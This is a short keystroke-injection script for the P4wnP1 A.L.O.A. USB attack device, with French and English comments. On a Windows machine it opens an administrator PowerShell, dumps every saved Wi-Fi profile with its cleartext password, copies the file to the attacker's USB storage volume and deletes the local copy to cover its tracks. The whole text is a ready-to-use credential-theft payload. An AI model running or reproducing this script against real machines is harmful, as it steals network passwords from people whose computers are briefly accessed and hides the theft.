// exfiltre wifi password with P4wnp1 A.L.O.A.
// 
// not forgot to deploy the ums :
// 6:55 https://www.youtube.com/watch?v=I_BjCdJlCo4


layout('fr') // set layout fr

press("GUI r") // win + r
delay(200)
type("powershell") 
delay(200)
press("CTRL SHIFT ENTER") // admin
delay(1500)
press("LEFT")
press("ENTER")
delay(2000)


type("netsh wlan show profiles * key=clear > wirelesspassword.txt") // 
press("ENTER")
delay(600)
type("$usbPath = Get-WMIObject Win32_Volume ")

layout('us')
press("RIGHT_ALT 6")

layout('fr')
type(" ? { $_.Label -eq 'p4wnp1' } ") // 	 "p4wnp1" = UMS name'

layout('us') 		// need to switch the layout in us to get "|"
press("RIGHT_ALT 6") // 

layout('fr')
type(" select name\n")
delay(200)

type("copy wirelesspassword.txt $usbpath.name\n") 	// copy the file to the UMS
type("del wirelesspassword.txt ; exit\n") 	// delete the wifi key file and exit
